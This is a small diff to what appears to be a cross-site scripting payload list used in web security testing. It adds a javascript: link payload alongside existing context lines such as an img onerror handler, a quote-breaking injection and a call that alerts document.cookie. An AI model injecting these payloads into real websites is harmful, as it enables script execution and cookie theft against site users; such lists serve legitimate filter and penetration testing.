@@ -88,3 +88,5 @@ frames['alert'](1)
 frames['alert'](document["cookie"])
 ";(a=alert,b=1,a(b))//
 <img src=x onerror=(a=alert,b=1,a(b))>
+<A HREF="javascript:alert(7)">Click here</A>
+
